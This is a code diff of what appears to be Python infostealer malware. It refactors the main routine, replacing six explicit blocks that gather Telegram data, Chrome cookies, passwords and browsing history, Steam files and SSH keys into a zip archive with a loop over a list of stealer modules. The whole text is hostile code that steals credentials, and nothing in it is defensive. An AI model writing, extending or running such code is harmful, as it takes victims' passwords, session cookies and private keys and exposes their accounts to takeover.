@@ -19,47 +19,8 @@ def main():
 
 	archive = ZipFile(archive_bytes, "w")
 
-	try:
-		telegram = stealers.telegram.steal()
-		with archive.open("telegram.zip", "w") as f:
-			f.write(telegram.read())
-	except:
-		pass
-
-	try:
-		chrome_cookies = stealers.chrome.cookies.steal()
-		with archive.open("chrome.cookies.sqlite", "w") as f:
-			f.write(chrome_cookies.read())
-	except:
-		pass
-
-	try:
-		chrome_passwords = stealers.chrome.passwords.steal()
-		with archive.open("chrome.passwords.sqlite", "w") as f:
-			f.write(chrome_passwords.read())
-	except:
-		pass
-
-	try:
-		chrome_history = stealers.chrome.history.steal()
-		with archive.open("chrome.history.sqlite", "w") as f:
-			f.write(chrome_history.read())
-	except:
-		pass
-
-	try:
-		steam = stealers.steam.steal()
-		with archive.open("steam.zip", "w") as f:
-			f.write(steam.read())
-	except:
-		pass
-
-	try:
-		ssh = stealers.ssh.steal()
-		with archive.open("ssh.zip", "w") as f:
-			f.write(ssh.read())
-	except:
-		pass
+	for stealer in stealers.stealers:
+		stealer.steal_archive(archive)
 
 	archive.close()
 
